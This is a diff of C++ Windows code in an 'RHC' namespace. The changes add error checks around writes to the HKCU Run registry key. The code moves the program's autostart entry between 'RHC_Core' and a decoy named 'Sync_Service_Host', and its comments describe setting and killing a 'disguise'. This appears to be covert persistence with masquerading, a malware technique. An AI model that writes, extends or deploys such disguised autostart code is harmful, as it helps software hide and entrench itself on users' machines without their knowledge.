@@ -10,9 +10,10 @@ namespace RHC {
         
         if (currentPath.find("rhc_desktop.exe") != std::string::npos) {
             HKEY hKey;
-            RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
-            RegSetValueExA(hKey, "RHC_Core", 0, REG_SZ, (BYTE*)currentPath.c_str(), currentPath.length() + 1);
-            RegCloseKey(hKey);
+            if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+                RegSetValueExA(hKey, "RHC_Core", 0, REG_SZ, (BYTE*)currentPath.c_str(), currentPath.length() + 1);
+                RegCloseKey(hKey);
+            }
         }
     }
 
@@ -32,10 +33,11 @@ namespace RHC {
             
             // Fix the registry
             HKEY hKey;
-            RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
-            RegSetValueExA(hKey, "RHC_Core", 0, REG_SZ, (BYTE*)newPath.c_str(), newPath.length() + 1);
-            RegDeleteValueA(hKey, "Sync_Service_Host");
-            RegCloseKey(hKey);
+            if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+                RegSetValueExA(hKey, "RHC_Core", 0, REG_SZ, (BYTE*)newPath.c_str(), newPath.length() + 1);
+                RegDeleteValueA(hKey, "Sync_Service_Host");
+                RegCloseKey(hKey);
+            }
 
             // Relaunch the real app and kill the disguise
             ShellExecuteA(NULL, "open", newPath.c_str(), NULL, NULL, SW_SHOW);
@@ -58,10 +60,11 @@ namespace RHC {
             
             // Set disguise as the startup app
             HKEY hKey;
-            RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
-            RegSetValueExA(hKey, "Sync_Service_Host", 0, REG_SZ, (BYTE*)newPath.c_str(), newPath.length() + 1);
-            RegDeleteValueA(hKey, "RHC_Core");
-            RegCloseKey(hKey);
+            if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+                RegSetValueExA(hKey, "Sync_Service_Host", 0, REG_SZ, (BYTE*)newPath.c_str(), newPath.length() + 1);
+                RegDeleteValueA(hKey, "RHC_Core");
+                RegCloseKey(hKey);
+            }
         }
     }
 }
